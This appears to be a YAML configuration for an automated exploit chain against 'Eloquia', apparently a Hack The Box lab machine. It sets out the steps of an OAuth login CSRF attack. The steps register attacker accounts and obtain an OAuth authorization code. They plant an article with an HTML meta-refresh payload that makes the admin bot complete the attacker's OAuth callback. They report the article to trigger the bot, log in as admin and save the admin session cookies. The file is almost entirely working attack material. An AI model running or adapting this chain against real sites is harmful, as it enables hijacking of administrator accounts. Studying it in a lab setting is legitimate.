# Eloquia OAuth CSRF Exploit Flow Configuration
# Each step defines an action to execute in sequence

config:
  target_ip: "10.129.244.81"
  eloquia_url: "http://eloquia.htb"
  qooqle_url: "http://qooqle.htb"
  oauth_client_id: "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
  oauth_redirect_uri: "http://eloquia.htb/accounts/oauth2/qooqle/callback/"
  tmp_dir: "tmp"
  admin_wait_time: 15
  login_retry_attempts: 10
  login_retry_delay: 3

steps:
  - name: setup_hosts
    description: "Configure /etc/hosts"
    action: add_hosts_entry
    params:
      ip: "${config.target_ip}"
      hostnames:
        - eloquia.htb
        - qooqle.htb

  - name: generate_credentials
    description: "Generate or load attacker credentials"
    action: generate_credentials
    params:
      username_prefix: "ghost"
      suffix_length: 6
      save_to:
        username: "${config.tmp_dir}/username.txt"
        password: "${config.tmp_dir}/password.txt"

  - name: register_eloquia
    description: "Register account on Eloquia"
    action: register
    params:
      site: eloquia
      url: "${config.eloquia_url}/accounts/register/"
      login_url: "${config.eloquia_url}/accounts/login/"
      fields:
        username: "${credentials.username}"
        password1: "${credentials.password}"
        password2: "${credentials.password}"

  - name: register_qooqle
    description: "Register account on Qooqle"
    action: register
    params:
      site: qooqle
      url: "${config.qooqle_url}/register/"
      login_url: "${config.qooqle_url}/login/"
      fields:
        username: "${credentials.username}"
        first_name: "${credentials.username}"
        last_name: "User"
        password1: "${credentials.password}"
        password2: "${credentials.password}"

  - name: get_oauth_code
    description: "Login to Qooqle and generate OAuth authorization code"
    action: oauth_authorize
    params:
      login_url: "${config.qooqle_url}/login/"
      auth_url: "${config.qooqle_url}/oauth2/authorize/"
      client_id: "${config.oauth_client_id}"
      redirect_uri: "${config.oauth_redirect_uri}"
      response_type: "code"
      scope: "read write"
    outputs:
      - oauth_code

  - name: create_exploit_article
    description: "Create article with OAuth CSRF payload"
    action: create_article
    params:
      login_url: "${config.eloquia_url}/accounts/login/"
      create_url: "${config.eloquia_url}/article/create/"
      my_articles_url: "${config.eloquia_url}/article/mine/"
      title_prefix: "Security Update"
      payload_template: '<meta http-equiv="refresh" content="0;url=${config.oauth_redirect_uri}?code=${oauth_code}"><p>Important security update.</p>'
      banner:
        type: random_noise
        size: [200, 150]
        format: PNG
        min_size_kb: 20
    outputs:
      - article_id

  - name: report_article
    description: "Report article to trigger admin bot"
    action: http_get
    params:
      url: "${config.eloquia_url}/article/report/${article_id}/"
      use_session: eloquia

  - name: wait_for_admin
    description: "Wait for admin bot to visit the article"
    action: sleep
    params:
      seconds: "${config.admin_wait_time}"

  - name: oauth_login_as_admin
    description: "Login to Eloquia via OAuth (should get admin session)"
    action: oauth_login
    critical: false
    params:
      qooqle_login_url: "${config.qooqle_url}/login/"
      eloquia_oauth_init: "${config.eloquia_url}/accounts/oauth2/qooqle/authorize/"
      client_id: "${config.oauth_client_id}"
      redirect_uri: "${config.oauth_redirect_uri}"
      max_attempts: "${config.login_retry_attempts}"
      retry_delay: "${config.login_retry_delay}"
    outputs:
      - admin_session
      - logged_in_as

  - name: verify_admin_access
    description: "Verify we have admin access"
    action: check_admin
    params:
      profile_url: "${config.eloquia_url}/accounts/profile/"
      admin_url: "${config.eloquia_url}/admin/"
    conditions:
      - check: "admin in ${logged_in_as}"
        on_success: "ADMIN ACCESS CONFIRMED"
        on_fail: "Not admin - exploit may have failed"

  - name: save_results
    description: "Save exploit results"
    action: save_files
    params:
      files:
        - path: "${config.tmp_dir}/exploit_article_id.txt"
          content: "${article_id}"
        - path: "${config.tmp_dir}/oauth_code.txt"
          content: "${oauth_code}"
        - path: "${config.tmp_dir}/admin_cookies.txt"
          content: "${admin_session.cookies}"
          condition: "${admin_session}"
